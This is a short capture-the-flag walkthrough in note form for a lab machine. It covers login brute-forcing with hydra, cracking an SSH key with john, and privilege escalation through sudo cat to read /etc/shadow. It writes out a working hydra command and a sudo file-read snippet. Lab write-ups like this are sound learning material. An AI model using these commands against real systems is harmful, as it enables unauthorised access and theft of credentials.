**Notes :**




## Gaining Access 😉
- hidden directory found /admin
- user is admin which was commented on source code
- used hydra to bruteforce: reffer [[#Important commands 🔥]] 1
- got an id_rsa which is ssh key cracked with john



## Maintaining Access 🥷
- sudo -l showing I can run /bin/cat without password
- gtfobin gave me hint: reffer [[#Important commands 🔥]] 2
- it's possible to read /etc/shadow
- got hash of root and cracked with john


## Important commands 🔥
1. hydra bruteforce
	```bash
	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.184.57 http-post-form 		"/admin/:user=  
	^USER^&pass=^PASS^:F=password invalid" -V
	```
2. reading with sudo
	```
	LFILE=file_to_read
	sudo cat "$LFILE"
	```
## Post Exploitation ✴️
- User flag : /home/user
- Root flag : /root/root
## Tips 💡
- while specifying directory in hydra, put a `/` after
- with cat sudo, we can read any files with root permission
- if you found something on gtfo bin just read and run
